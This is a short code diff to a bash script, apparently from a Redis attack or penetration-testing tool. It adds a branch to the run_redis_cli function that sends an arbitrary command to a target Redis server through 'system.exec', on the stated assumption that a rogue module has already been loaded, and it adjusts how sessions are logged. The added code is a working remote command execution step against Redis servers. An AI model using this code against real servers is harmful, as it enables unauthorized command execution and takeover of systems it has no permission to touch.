@@ -204,8 +204,13 @@ run_redis_cli() {
     if [[ ! -z $password ]]; then
         password_option="-a $password"
     fi
+    if [[ ! -z $cmd ]] && [[ ! -z $redis_version ]]; then
+        echo "Executing command: $cmd, assuming rogue module was loaded"
+        redis-cli -h $target_ip -p $target_port $password_option system.exec "$cmd" | tee >(remove_color_to_log "$log_dir/redis_$target_ip.log")
+        return 0
+    fi
     if ! pgrep -f "redis-cli -h $target_ip"; then
-        redis-cli -h $target_ip -p $target_port $password_option | tee -a "log/redis_$target_ip.log"
+        redis-cli -h $target_ip -p $target_port $password_option | tee >(remove_color_to_log >> "$log_dir/redis_$target_ip.log")
     else
         echo "Redis-cli session already running"
     fi
